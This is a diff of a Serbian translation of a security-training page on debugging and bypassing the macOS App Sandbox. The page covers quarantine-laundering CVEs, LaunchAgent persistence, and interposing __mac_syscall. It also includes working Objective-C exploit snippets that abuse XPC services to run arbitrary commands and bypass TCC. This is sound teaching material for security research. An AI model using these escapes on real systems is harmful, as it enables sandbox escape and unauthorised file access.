@@ -1,41 +1,41 @@
-# Debugovanje i zaobilaženje macOS Sandbox-a
+# Debugovanje i bypass macOS Sandbox-a
 
 {{#include ../../../../../banners/hacktricks-training.md}}
 
-## Proces učitavanja Sandbox-a
+## Proces učitavanja sandbox-a
 
 <figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Slika iz <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>
 
-Na prethodnoj slici moguće je videti **kako će se Sandbox učitati** kada se pokrene aplikacija sa entitlementom **`com.apple.security.app-sandbox`**.
+Na prethodnoj slici moguće je videti **kako će sandbox biti učitan** kada se pokrene aplikacija sa entitlement-om **`com.apple.security.app-sandbox`**.
 
-Kompajler će povezati `/usr/lib/libSystem.B.dylib` sa binarnom datotekom.
+Compiler će povezati `/usr/lib/libSystem.B.dylib` sa binary-jem.
 
-Zatim će **`libSystem.B`** pozvati nekoliko drugih funkcija, sve dok **`xpc_pipe_routine`** ne pošalje entitlements aplikacije procesu **`securityd`**. Securityd proverava da li proces treba da bude stavljen u karantin unutar Sandbox-a i, ako treba, biće stavljen u karantin.\
-Na kraju, Sandbox će biti aktiviran pozivom **`__sandbox_ms`**, koji će pozvati **`__mac_syscall`**.<sup>[[1]](#references)[[3]](#references)</sup>
+Zatim **`libSystem.B`** poziva nekoliko funkcija, sve dok **`xpc_pipe_routine`** ne pošalje entitlement-e aplikacije procesu **`securityd`**. Securityd proverava da li proces treba da bude izolovan unutar sandbox-a i, ako treba, izoluje ga.\
+Na kraju se sandbox aktivira pozivom **`__sandbox_ms`**, koji poziva **`__mac_syscall`**.<sup>[[1]](#references)[[3]](#references)</sup>
 
-## Moguća zaobilaženja
+## Mogući bypass-i
 
-### Zaobilaženje quarantine atributa
+### Bypass quarantine atributa
 
-**Datotekama koje kreiraju sandboxovani procesi** dodaje se **quarantine atribut** kako bi se sprečili sandbox escapes: ako ispustite novu aplikaciju i pokušate da je pokrenete, quarantine flag će je zaustaviti. Zato, **ako možete da ispustite datoteku ili folder *bez* quarantine atributa, možete napustiti App Sandbox** — samo ispustite `.app` bundle i pokrenite ga pomoću `open`, jer se novopokrenuti proces izvršava pod LaunchServices, a ne pod vašim Sandbox-om.
+**Fajlovima koje kreiraju sandboxed procesi** dodaje se **quarantine atribut** kako bi se sprečili sandbox escape-ovi: ako ubacite novu aplikaciju i pokušate da je pokrenete, quarantine flag će je zaustaviti. Zato, **ako možete da ubacite fajl ili folder *bez* quarantine atributa, možete napustiti App Sandbox** — samo ubacite `.app` bundle i pokrenite ga pomoću `open`, jer se novopokrenuti proces izvršava pod LaunchServices, a ne unutar vašeg sandbox-a.
 
-Pouzdan način da dobijete **unquarantined drop** jeste da zatražite od **drugog procesa da kreira datoteku umesto vas**. Kao što je dokumentovano u tekstu [**A New Era of macOS Sandbox Escapes**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) autora Mickey Jin, **App Sandbox** označava ispuštene datoteke quarantine atributom, ali XPC services koji se izvršavaju pod Service Sandbox-om to ne rade. Nekoliko neautentifikovanih XPC services zato se moglo koristiti kao primitiv za „quarantine laundering“:<sup>[[4]](#references)</sup>
+Pouzdan način da dobijete **unquarantined drop** jeste da zatražite od **drugog procesa da kreira fajl umesto vas**. Kao što je dokumentovano u radu [**A New Era of macOS Sandbox Escapes**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) autora Mickey Jin, **App Sandbox** označava ubačene fajlove quarantine atributom, ali **XPC services koje rade pod Service Sandbox-om to ne rade**. Zbog toga je nekoliko neautentifikovanih XPC services moglo da se koristi kao primitive za "quarantine laundering":<sup>[[4]](#references)</sup>
 
-- **CVE-2023-27944** (`TrialArchivingService`) i **CVE-2023-32414** (`ArchiveService`): raspakuju arhivu koju sandboxovana aplikacija prosledi na izabranu lokaciju **bez prosleđivanja quarantine xattr-a** raspakovanom sadržaju.
-- **CVE-2023-42977** (`PerfPowerServicesSignpostReader`): path traversal u `submitSignpostDataWithConfig:` omogućio je kreiranje **proizvoljnih direktorijuma bez quarantine-a**, što je dovoljno za izgradnju cele `.app` bundle strukture izvan containera.
-- **CVE-2024-27864** (`diskimagescontroller.xpc`): priključuje quarantined DMG **bez stavljanja rezultujućeg uređaja u quarantine**, tako da se aplikacije na montiranom volume-u mogu pokrenuti.
+- **CVE-2023-27944** (`TrialArchivingService`) i **CVE-2023-32414** (`ArchiveService`): ekstraktuju arhivu prosleđenu od sandboxed aplikacije na izabranu lokaciju **bez propagiranja quarantine xattr-a** na ekstraktovani sadržaj.
+- **CVE-2023-42977** (`PerfPowerServicesSignpostReader`): path traversal u `submitSignpostDataWithConfig:` omogućavao je kreiranje **proizvoljnih direktorijuma bez quarantine-a**, što je dovoljno za izgradnju kompletne strukture `.app` bundle-a izvan containera.
+- **CVE-2024-27864** (`diskimagescontroller.xpc`): priključuje quarantined DMG **bez quarantine-a na rezultujućem uređaju**, tako da se aplikacije na montiranom volume-u mogu pokrenuti.
 
 > [!TIP]
-> Raspakivanje obično **uklanja executable permission bit**. Workaround korišćen u CVE-2023-27944 bio je postavljanje **symlink-a** ka postojećoj potpisanoj sistemskoj binarnoj datoteci (npr. `/System/Library/CoreServices/Automator Application Stub`) kao glavnog executable-a bundle-a, čime on ostaje pokretljiv bez potrebe za `+x` na ispuštenoj datoteci.
+> Ekstrakcija obično **uklanja executable permission bit**. Workaround korišćen u CVE-2023-27944 bio je postavljanje **symlink-a** ka postojećem potpisanom system binary-ju (npr. `/System/Library/CoreServices/Automator Application Stub`) kao glavnog executable-a bundle-a, čime on ostaje pokretljiv bez potrebe za `+x` nad ubačenim fajlom.
 
 > [!CAUTION]
-> Razlog zbog kog ovo funkcioniše jeste to što se provera zasniva na **flag-u stavke koja se pokreće**: *„When an app or other executable code is run from the Finder or GUI, macOS checks its quarantine flag before loading it“*, a tek zatim *„it's handed over to Gatekeeper for full 'first run' security checks“* ([Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)). Ako bundle koji pokrećete nema flag, nema ni Gatekeeper provere — upravo je to primitiv koji obezbeđuju navedeni CVE-ovi.<sup>[[5]](#references)</sup>
+> Ovo funkcioniše zato što se provera zasniva na **flag-u stavke koja se pokreće**: *"When an app or other executable code is run from the Finder or GUI, macOS checks its quarantine flag before loading it"*, a tek zatim *"it's handed over to Gatekeeper for full 'first run' security checks"* ([Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)). Ako bundle koji pokrećete nema flag, nema ni Gatekeeper provere — upravo to omogućavaju prethodno navedeni CVE-ovi.<sup>[[5]](#references)</sup>
 >
-> Imajte na umu da, ako je `.app` bundle već autorizovan za pokretanje (ima quarantine xattr sa uključenim flag-om „authorized to run“), možete zloupotrebiti i njega... osim što sada ne možete da pišete unutar **`.app`** bundle-a, osim ako nemate neke privilegovane TCC permissions (što nećete imati unutar Sandbox-a).
+> Imajte na umu da, ako je `.app` bundle već autorizovan za pokretanje (ima quarantine xattr sa uključenim flag-om "authorized to run"), možete zloupotrebiti i njega... osim što sada ne možete pisati unutar **`.app`** bundle-a, osim ako nemate neke privilegovane TCC perms, koje nećete imati unutar sandbox-a.
 
 ### Zloupotreba Open funkcionalnosti
 
-U [**poslednjim primerima Word sandbox bypass-a**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) može se videti kako se **`open`** cli funkcionalnost može zloupotrebiti za zaobilaženje Sandbox-a.
+U [**poslednjim primerima Word sandbox bypass-a**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) može se videti kako se **`open`** CLI funkcionalnost može zloupotrebiti za bypass sandbox-a.
 
 
 {{#ref}}
@@ -44,14 +44,14 @@ macos-office-sandbox-bypasses.md
 
 ### Launch Agents/Daemons
 
-Čak i ako je aplikacija **predviđena za rad u Sandbox-u** (`com.apple.security.app-sandbox`), moguće je zaobići Sandbox ako se, na primer, **izvršava iz LaunchAgent-a** (`~/Library/LaunchAgents`).\
-Kao što je objašnjeno u [**ovom postu**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), ako želite da ostvarite persistence pomoću sandboxovane aplikacije, možete podesiti da se ona automatski izvršava kao LaunchAgent i možda ubaciti maliciozni kod preko DyLib environment variables.<sup>[[6]](#references)</sup>
+Čak i ako je aplikacija **namenjena za rad u sandbox-u** (`com.apple.security.app-sandbox`), moguće je zaobići sandbox ako se aplikacija, na primer, **izvršava iz LaunchAgent-a** (`~/Library/LaunchAgents`).\
+Kao što je objašnjeno u [**ovoj objavi**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), ako želite da ostvarite persistence pomoću sandboxed aplikacije, možete podesiti da se ona automatski izvršava kao LaunchAgent i možda ubaciti malicious code putem DyLib environment variables.<sup>[[6]](#references)</sup>
 
 ### Zloupotreba Auto Start lokacija
 
-Ako sandboxovani proces može da **piše** na mesto gde će **nesandboxovana aplikacija kasnije pokrenuti binarnu datoteku**, moći će da **napusti Sandbox jednostavnim postavljanjem** binarne datoteke na to mesto. Dobri primeri ovakvih lokacija su `~/Library/LaunchAgents` ili `/System/Library/LaunchDaemons`.
+Ako sandboxed proces može da **piše** na mesto na kom će **kasnije unsandboxed aplikacija pokrenuti binary**, moći će da **napusti sandbox jednostavnim postavljanjem** binary-ja na to mesto. Dobri primeri ovakvih lokacija su `~/Library/LaunchAgents` ili `/System/Library/LaunchDaemons`.
 
-Za ovo će vam možda biti potrebna čak i **2 koraka**: da proces sa **permisivnijim Sandbox-om** (`file-read*`, `file-write*`) izvrši vaš kod, koji će zapravo pisati na mesto gde će se izvršiti bez Sandbox-a.
+Za ovo će vam možda biti potrebna čak **2 koraka**: da naterate proces sa **permisivnijim sandbox-om** (`file-read*`, `file-write*`) da izvrši vaš code, koji će zatim pisati na mesto na kom će biti **izvršen bez sandbox-a**.
 
 Pogledajte ovu stranicu o **Auto Start lokacijama**:
 
@@ -62,20 +62,20 @@ Pogledajte ovu stranicu o **Auto Start lokacijama**:
 
 ### Zloupotreba drugih procesa
 
-Ako iz sandboxovanog procesa možete da **kompromitujete druge procese** koji rade u manje restriktivnim Sandbox-ovima (ili bez Sandbox-a), moći ćete da pređete u njihove Sandbox-ove:
+Ako iz sandboxed procesa možete da **kompromitujete druge procese** koji rade u manje restriktivnim sandbox-ovima (ili bez sandbox-a), moći ćete da pređete u njihove sandbox-e:
 
 
 {{#ref}}
 ../../../macos-proces-abuse/
 {{#endref}}
 
-### Dostupni System i User Mach services
+### Dostupni System i User Mach servisi
 
-Sandbox takođe omogućava komunikaciju sa određenim **Mach services** putem XPC-a definisanog u profilu `application.sb`. Ako možete da **zloupotrebite** neki od ovih services, možda ćete moći da **napustite Sandbox**.
+Sandbox takođe omogućava komunikaciju sa određenim **Mach servisima** putem XPC-a, koji su definisani u profilu `application.sb`. Ako možete da **zloupotrebite** neki od ovih servisa, možda ćete moći da **napustite sandbox**.
 
-Kao što je navedeno u [ovom writeup-u](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), informacije o Mach services nalaze se u `/System/Library/xpc/launchd.plist`. Sve System i User Mach services moguće je pronaći pretragom tog fajla za `<string>System</string>` i `<string>User</string>`.<sup>[[4]](#references)</sup>
+Kao što je navedeno u [ovom writeup-u](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), informacije o Mach servisima čuvaju se u `/System/Library/xpc/launchd.plist`. Sve System i User Mach servise moguće je pronaći pretragom tog fajla za `<string>System</string>` i `<string>User</string>`.<sup>[[4]](#references)</sup>
 
-Pored toga, moguće je proveriti da li je Mach service dostupan sandboxovanoj aplikaciji pozivanjem `bootstrap_look_up`:
+Pored toga, moguće je proveriti da li je Mach servis dostupan sandboxed aplikaciji pozivanjem funkcije `bootstrap_look_up`:
 ```objectivec
 void checkService(const char *serviceName) {
 mach_port_t service_port = MACH_PORT_NULL;
@@ -100,9 +100,9 @@ checkService(serviceName.UTF8String);
 ```
 ### Dostupni PID Mach servisi
 
-Ovi Mach servisi su prvi put zloupotrebljeni za [escape iz sandboxa u ovom writeup-u](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). U to vreme, **svi XPC servisi koje zahteva** aplikacija i njen framework bili su vidljivi u PID domenu aplikacije (to su Mach Services sa `ServiceType` postavljenim na `Application`).<sup>[[4]](#references)</sup>
+Ovi Mach servisi su prvi put zloupotrebljeni za [bekstvo iz sandbox-a u ovom tekstu](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). U to vreme, **svi XPC servisi koje su zahtevali** aplikacija i njen framework bili su vidljivi u domenu PID-a aplikacije (to su Mach Services sa `ServiceType` postavljenim na `Application`).<sup>[[4]](#references)</sup>
 
-Da bi se **kontaktirao XPC servis PID domena**, potrebno je samo registrovati ga unutar aplikacije linijom kao što je:
+Da biste **kontaktirali XPC servis PID Domain-a**, potrebno je samo da ga registrujete unutar aplikacije linijom kao što je:
 ```objectivec
 [[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
 ```
@@ -113,13 +113,13 @@ Drugi način za pronalaženje validnih xpc services jeste provera onih u:
 find /System/Library/Frameworks -name "*.xpc"
 find /System/Library/PrivateFrameworks -name "*.xpc"
 ```
-Nekoliko primera zloupotrebe ove tehnike može se pronaći u [**originalnom opisu**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), međutim, u nastavku su navedeni neki sažeti primeri.<sup>[[4]](#references)</sup>
+Nekoliko primera zloupotrebe ove tehnike možete pronaći u [**originalnom writeup-u**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), međutim, u nastavku su neki sažeti primeri.<sup>[[4]](#references)</sup>
 
 #### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc
 
 Ovaj servis dozvoljava svaku XPC konekciju tako što uvek vraća `YES`, a metoda `runTask:arguments:withReply:` izvršava proizvoljnu komandu sa proizvoljnim parametrima.
 
-Exploit je bio „jednostavan koliko i“:
+Exploit je bio „jednostavan kao“:
 ```objectivec
 @protocol SKRemoteTaskRunnerProtocol
 -(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@@ -140,9 +140,9 @@ NSLog(@"run task result:%@, error:%@", bSucc, error);
 ```
 #### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc
 
-Ovaj XPC service je dozvoljavao svakom client-u tako što je uvek vraćao `YES`, a metoda `createZipAtPath:hourThreshold:withReply:` prihvatala je putanju do foldera i kompresovala ga u ZIP file.
+Ovaj XPC service je dozvoljavao svakom klijentu pristup tako što je uvek vraćao `YES`, a metod `createZipAtPath:hourThreshold:withReply:` prihvatao je putanju do foldera i kompresovao ga u ZIP datoteku.
 
-Zato je moguće generisati lažnu strukturu app foldera, kompresovati je, zatim je dekompresovati i izvršiti kako bi se pobeglo iz sandbox-a, pošto nove datoteke neće imati quarantine atribut.
+Zato je moguće generisati lažnu strukturu foldera aplikacije, kompresovati je, a zatim je dekompresovati i izvršiti kako bi se izašlo iz sandbox-a, pošto nove datoteke neće imati quarantine atribut.
 
 Exploit je bio:
 ```objectivec
@@ -185,7 +185,7 @@ break;
 
 Ovaj XPC service omogućava davanje read i write pristupa proizvoljnom URL-u XPC klijentu putem metode `extendAccessToURL:completion:`, koja je prihvatala bilo koju konekciju. Pošto XPC service ima FDA, moguće je zloupotrebiti ove dozvole za potpuno zaobilaženje TCC-a.
 
-Exploit je bio:
+Eksploatacija je bila:
 ```objectivec
 @protocol WFFileAccessHelperProtocol
 - (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@@ -215,38 +215,38 @@ NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
 ```
 ### Statičko kompajliranje i dinamičko linkovanje
 
-[**Ovo istraživanje**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) otkrilo je 2 načina za zaobilaženje Sandbox-a. Pošto se sandbox primenjuje iz userland-a prilikom učitavanja biblioteke **libSystem**, ako bi binary mogao da izbegne njeno učitavanje, nikada ne bi bio sandbox-ovan:<sup>[[2]](#references)</sup>
+[**Ovo istraživanje**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) otkrilo je 2 načina za zaobilaženje Sandbox-a. Pošto se sandbox primenjuje iz userland-a kada se učita **libSystem** biblioteka. Ako bi binarni fajl mogao da izbegne njeno učitavanje, nikada ne bi bio sandbox-ovan:<sup>[[2]](#references)</sup>
 
-- Ako bi binary bio **u potpunosti statički kompajliran**, mogao bi da izbegne učitavanje te biblioteke.
-- Ako **binary ne bi morao da učitava nijednu biblioteku** (pošto se linker takođe nalazi u libSystem-u), ne bi morao da učita libSystem.
+- Ako bi binarni fajl bio **potpuno statički kompajliran**, mogao bi da izbegne učitavanje te biblioteke.
+- Ako **binarni fajl ne bi morao da učita nijednu biblioteku** (pošto se linker takođe nalazi u libSystem-u), ne bi morao da učita libSystem.
 
 ### Shellcodes
 
-Imajte na umu da čak i **shellcodes** u ARM64 moraju biti linkovani sa `libSystem.dylib`:
+Imajte na umu da čak i **shellcodes** na ARM64 moraju biti linkovani sa `libSystem.dylib`:
 ```bash
 ld -o shell shell.o -macosx_version_min 13.0
 ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
 ```
-### Ograničenja koja se ne nasleđuju
+### Restrikcije koje se ne nasleđuju
 
-Kao što je objašnjeno u **[dodatku ovog writeup-a](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**, sandbox ograničenje poput:<sup>[[4]](#references)</sup>
+Kao što je objašnjeno u **[dodatku ovog writeup-a](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**, ograničenje sandbox-a kao što je:<sup>[[4]](#references)</sup>
 ```
 (version 1)
 (allow default)
 (deny file-write* (literal "/private/tmp/sbx"))
 ```
-može se zaobići novim procesom koji se, na primer, izvršava:
+može se zaobići tako što novi proces izvršava, na primer:
 ```bash
 mkdir -p /tmp/poc.app/Contents/MacOS
 echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
 chmod +x /tmp/poc.app/Contents/MacOS/poc
 open /tmp/poc.app
 ```
-Međutim, naravno, ovaj novi proces neće naslediti entitlements niti privilegije od roditeljskog procesa.
+Međutim, naravno, ovaj novi proces neće naslediti entitlements ili privilegije od roditeljskog procesa.
 
 ### Entitlements
 
-Imajte na umu da čak i ako su neke **radnje** **dozvoljene u sandbox-u** kada aplikacija ima određeni **entitlement**, kao u:
+Imajte na umu da čak i ako neke **radnje** mogu biti **dozvoljene u sandbox-u** ako aplikacija ima određeni **entitlement**, kao u:
 ```scheme
 (when (entitlement "com.apple.security.network.client")
 (allow network-outbound (remote ip))
@@ -258,7 +258,7 @@ Imajte na umu da čak i ako su neke **radnje** **dozvoljene u sandbox-u** kada a
 ```
 ### Interposting Bypass
 
-Za više informacija o tehnici **Interposting** pogledajte:
+Za više informacija o **Interposting** tehnici pogledajte:
 
 
 {{#ref}}
@@ -289,7 +289,7 @@ DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 _libsecinit_initializer called
 Sandbox Bypassed!
 ```
-#### Interpost `__mac_syscall` radi sprečavanja Sandbox-a
+#### Interpost `__mac_syscall` da sprečiš Sandbox
 ```c:interpose.c
 // gcc -dynamiclib interpose.c -o interpose.dylib
 
@@ -333,9 +333,9 @@ __mac_syscall invoked. Policy: Quarantine, Call: 87
 __mac_syscall invoked. Policy: Sandbox, Call: 4
 Sandbox Bypassed!
 ```
-### Debugovanje i zaobilaženje Sandbox-a pomoću lldb-a
+### Debug & bypass Sandbox with lldb
 
-Hajde da kompajliramo aplikaciju koja bi trebalo da bude u Sandbox-u:
+Hajde da kompajliramo aplikaciju koja bi trebalo da bude sandboxed:
 
 {{#tabs}}
 {{#tab name="sand.c"}}
@@ -383,14 +383,14 @@ gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.pli
 codesign -s <cert-name> --entitlements entitlements.xml sand
 ```
 > [!CAUTION]
-> Aplikacija će pokušati da **pročita** datoteku **`~/Desktop/del.txt`**, što joj **Sandbox neće dozvoliti**.\
-> Kreirajte datoteku tamo, jer će nakon zaobilaženja Sandbox-a moći da je pročita:
+> Aplikacija će pokušati da **pročita** datoteku **`~/Desktop/del.txt`**, što **Sandbox** neće dozvoliti.\
+> Kreirajte datoteku na toj lokaciji, jer će, nakon zaobilaženja **Sandbox-a**, moći da je pročita:
 >
 > ```bash
 > echo "Sandbox Bypassed" > ~/Desktop/del.txt
 > ```
 
-Hajde da debug-ujemo aplikaciju da vidimo kada se Sandbox učitava:
+Hajde da otklonimo greške u aplikaciji da bismo videli kada se **Sandbox** učitava:
 ```bash
 # Load app in debugging
 lldb ./sand
@@ -467,14 +467,14 @@ Process 2517 resuming
 Sandbox Bypassed!
 Process 2517 exited with status = 0 (0x00000000)
 ```
-> [!WARNING] > **Čak i kada je Sandbox zaobiđen, TCC** će pitati korisnika da li želi da dozvoli procesu da čita datoteke sa desktopa
+> [!WARNING] > **Čak i kada je Sandbox zaobiđen, TCC** će pitati korisnika da li želi da dozvoli procesu da čita datoteke sa radne površine
 
 ## References
 
-- [1] [Jonathan Levin - Apple Sandbox: Dublje u močvaru (HITB GSEC 2016 slides)](http://newosxbook.com/files/HITSB.pdf)
-- [2] [Saagar Jha - Izlazak iz Mac App Store Sandbox-a](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
-- [3] [Jonathan Levin - Apple Sandbox: Dublje u močvaru (HITB GSEC 2016)](https://www.youtube.com/watch?v=mG715HcDgO8)
-- [4] [Mickey Jin - Nova era macOS Sandbox izlazaka](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) (unquarantined drops via XPC services: CVE-2023-27944, CVE-2023-32414, CVE-2023-42977, CVE-2024-27864)
+- [1] [Jonathan Levin - Apple Sandbox: Dublje u živo blato (HITB GSEC 2016 slides)](http://newosxbook.com/files/HITSB.pdf)
+- [2] [Saagar Jha - Mac App Store Sandbox Escape](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
+- [3] [Jonathan Levin - Apple Sandbox: Dublje u živo blato (HITB GSEC 2016)](https://www.youtube.com/watch?v=mG715HcDgO8)
+- [4] [Mickey Jin - Nova era macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) (unquarantined drops via XPC services: CVE-2023-27944, CVE-2023-32414, CVE-2023-42977, CVE-2024-27864)
 - [5] [The Eclectic Light Company - Objašnjenje: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)
-- [6] [Vicarius vSociety - CVE-2023-26818 (Sandbox): macOS TCC Bypass w/ Telegram using DyLib Injection (Part 2)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)
+- [6] [Vicarius vSociety - CVE-2023-26818 (Sandbox): macOS TCC Bypass uz Telegram korišćenjem DyLib Injection (Part 2)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)
 {{#include ../../../../../banners/hacktricks-training.md}}
